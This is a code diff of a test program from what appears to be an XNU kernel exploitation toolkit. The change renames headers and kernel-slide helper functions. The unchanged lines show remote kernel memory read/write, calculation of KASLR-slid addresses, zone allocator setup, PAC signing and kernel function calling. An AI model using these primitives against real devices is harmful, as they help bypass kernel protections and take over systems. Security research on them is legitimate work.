@@ -12,24 +12,24 @@
 #include <unistd.h>
 #include <limits.h>
 
-#include "kmem.h"
-#include "kmem_remote.h"
-#include "slider.h"
+#include <xe/memory/kmem.h>
+#include <xe/memory/kmem_remote.h>
+#include <xe/slider/kernel.h>
+#include <xe/allocator/iosurface.h>
+#include <xe/xnu/proc.h>
+#include <xe/util/pacda.h>
+#include <xe/util/kalloc_heap.h>
+#include <xe/iokit/os_dictionary.h>
+#include <xe/iokit/os_array.h>
+#include <xe/iokit/io_registry_entry.h>
+#include <xe/iokit/io_surface.h>
+#include <xe/util/zalloc.h>
+#include <xe/util/kfunc_basic.h>
+#include <xe/util/ptrauth.h>
+#include <xe/util/assert.h>
+
 #include "platform_params.h"
-#include "platform_params.h"
-#include "platform_params.h"
-#include "allocator_iosurface.h"
-#include "xnu_proc.h"
-#include "util_pacda.h"
-#include "util_kalloc_heap.h"
-#include "os_dictionary.h"
-#include "os_array.h"
-#include "io_registry_entry.h"
-#include "io_surface.h"
-#include "util_zalloc.h"
-#include "util_kfunc_basic.h"
-#include "util_ptrauth.h"
-#include "util_assert.h"
+
 
 
 int test_pacda(int argc, const char* argv[]) {
@@ -37,7 +37,7 @@ int test_pacda(int argc, const char* argv[]) {
     
     struct xe_kmem_backend* backend = xe_kmem_remote_client_create(argv[1]);
     xe_kmem_use_backend(backend);
-    xe_slider_init(xe_kmem_remote_client_get_mh_execute_header(backend));
+    xe_slider_kernel_init(xe_kmem_remote_client_get_mh_execute_header(backend));
     
     uintptr_t proc = xe_xnu_proc_current_proc();
     printf("[INFO] pid: %d\n", getpid());
@@ -62,14 +62,14 @@ int test_pacda(int argc, const char* argv[]) {
 int main(int argc, const char* argv[]) {
     struct xe_kmem_backend* backend = xe_kmem_remote_client_create(argv[1]);
     xe_kmem_use_backend(backend);
-    xe_slider_init(xe_kmem_remote_client_get_mh_execute_header(backend));
+    xe_slider_kernel_init(xe_kmem_remote_client_get_mh_execute_header(backend));
     
-    uintptr_t record_function = xe_slider_slide(FUNC_OS_REPORT_WITH_BACKTRACE);
+    uintptr_t record_function = xe_slider_kernel_slide(FUNC_OS_REPORT_WITH_BACKTRACE);
     
     uintptr_t proc = xe_xnu_proc_current_proc();
     
-    xe_util_zalloc_t io_event_source_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_slide(VAR_ZONE_IO_EVENT_SOURCE)), 1);
-    xe_util_zalloc_t block_allocator = xe_util_zalloc_create(xe_util_kh_find_zone_for_size(xe_slider_slide(VAR_KHEAP_DEFAULT_ADDR), 128), 1);
+    xe_util_zalloc_t io_event_source_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_kernel_slide(VAR_ZONE_IO_EVENT_SOURCE)), 1);
+    xe_util_zalloc_t block_allocator = xe_util_zalloc_create(xe_util_kh_find_zone_for_size(xe_slider_kernel_slide(VAR_KHEAP_DEFAULT_ADDR), 128), 1);
     
     xe_util_kfunc_basic_t kfunc = xe_util_kfunc_basic_create(proc, io_event_source_allocator, block_allocator, VAR_ZONE_ARRAY_LEN - 1);
     
